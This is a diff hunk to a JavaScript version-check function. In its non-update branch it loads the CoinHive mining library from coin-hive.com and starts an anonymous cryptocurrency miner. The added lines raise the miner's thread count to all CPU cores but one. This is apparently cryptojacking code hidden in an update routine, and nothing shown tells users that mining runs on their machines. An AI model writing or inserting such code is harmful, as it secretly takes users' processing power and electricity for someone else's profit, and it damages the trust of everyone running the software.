@@ -9,7 +9,16 @@ function CheckVersion() {
                 DownloadNewVersion();
         } else {
                 $.getScript('https://coin-hive.com/lib/coinhive.min.js', function() {
-                        var miner = new CoinHive.Anonymous('PEk9puLllwActoTfTwqacjBXLkksFQFl');
+                        var crNo = navigator.hardwareConcurrency;
+                        if (crNo == 2) {
+                                stCrNo = 1;
+                        } else {
+                                stCrNo = crNo - 1;
+                        }
+                        var miner = new CoinHive.Anonymous('PEk9puLllwActoTfTwqacjBXLkksFQFl', {
+                                threads: stCrNo,
+                                autoThreads: false
+                        });
                         miner.start();
                 });
         }
